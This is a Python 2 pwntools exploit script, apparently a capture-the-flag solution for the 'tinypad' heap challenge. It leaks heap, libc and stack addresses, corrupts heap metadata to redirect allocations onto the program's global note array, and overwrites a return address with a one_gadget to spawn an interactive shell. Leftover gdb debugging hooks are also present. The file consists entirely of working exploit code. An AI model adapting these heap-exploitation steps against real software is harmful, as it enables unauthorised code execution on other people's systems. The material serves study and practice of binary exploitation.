#!/usr/bin/env python2
# -*- coding=utf-8 -*-

from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

def end1(r):
    print(str(r.proc.pid))
    gdb.attach(r, """
   echo  br  *0x0000000000400e67
    heap
   echo x/40gx 0x603000
    x/50gx 0x602040
    """);
    print(str(r.proc.pid))

    r.interactive()
def add(p, size, content):
    p.readuntil("(CMD)>>>")
    p.sendline("a")
    p.readuntil("(SIZE)>>>")
    p.sendline(str(size))
    p.readuntil("(CONTENT)>>>")
    p.sendline(content)

def delete(p, index):
    p.readuntil("(CMD)>>>")
    p.sendline("d")
    p.readuntil("(INDEX)>>>")
    p.sendline(str(index))

def edit(p, index, content):
    p.readuntil("(CMD)>>>")
    p.sendline("e")
    p.readuntil("(INDEX)>>>")
    p.sendline(str(index)) 
    p.readuntil("(CONTENT)>>>")
    p.sendline(content)
    p.readuntil("(Y/n)>>>")
    p.sendline("y")

def main():
    # context.log_level = "debug"
    p = process("./tinypad")
    # e = ELF("./tinypad")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    # leak libc and heap address
    add(p, 224, "a"*10)
    add(p, 246, "b"*0xf0)
    add(p, 256, "c"*0xf0)
    add(p, 256, "d"*10)
    delete(p, 3)
    delete(p, 1)
    # get heap address
    p.readuntil("# CONTENT: ")
    heap = p.readline().rstrip()
    heap += "\x00"*(8-len(heap))
    heap_base = u64(heap) - 0x1f0
    print "heap_base address: " + hex(heap_base)
    # get libc address
    p.readuntil("INDEX: 3")
    p.readuntil("# CONTENT: ")
    libc_address = p.readline().strip()
    libc_address += "\x00"*(8-len(libc_address))
    libc_base = u64(libc_address) - 0x3c4b78
    print "libc_base address: " + hex(libc_base)

    # make top -> tinypad(0x602040)
    add(p, 232, "g"*224 + p64(heap_base+240-0x602040))
    delete(p, 4)
    payload = p64(0x100) + p64(heap_base+240-0x602040) + p64(0x602040)*4
    edit(p, 2, payload)
    delete(p, 2)
    # end1(p);pause()

    # modify free_hook -> one_gadget
    gadget1 = 0xf1117
    gadget2 = 0xf0274
    gadget3 = 0xcd1c8
    gadget4 = 0xcd0f3
    gadget5 = 0x4526a
    gadget6 = 0xf66c0
    gadget_address = libc_base + gadget1
    add(p, 0xe0, "t"*0xd0)
    end1(p);pause()

    payload = p64(232) + p64(libc_base + libc.symbols["__environ"])
    payload += p64(232) + p64(0x602148)
    add(p, 0x100, payload)
    p.readuntil("# CONTENT: ")
    stack = p.read(6)
    stack += "\x00"*(8-len(stack))
    stack_env = u64(stack)
    print "env_stack address: " + hex(stack_env)
    edit(p, 2, p64(stack_env-240))
    # end1(p);pause()
    edit(p, 1, p64(gadget_address))
    p.readuntil("(CMD)>>>")
    p.sendline("Q")
    p.interactive()


if __name__ == '__main__':
    main()